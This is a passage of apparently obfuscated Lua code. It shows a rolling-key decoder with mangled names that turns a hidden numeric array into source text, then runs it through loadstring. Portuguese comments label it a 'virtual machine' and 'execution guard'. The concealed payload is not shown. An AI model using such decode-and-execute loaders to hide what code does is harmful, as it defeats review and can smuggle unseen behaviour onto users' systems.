    local function VM_I00O(d, k, m)
        local R_1OI10II = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_1OI10II, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_1OI10II)
    end

    -- Execution Guard
    local F_OIll1 = loadstring(VM_I00O(B_l1IIO0, 74, 5))
    if F_OIll1 then
        F_OIll1(...)
    end
end)(...)
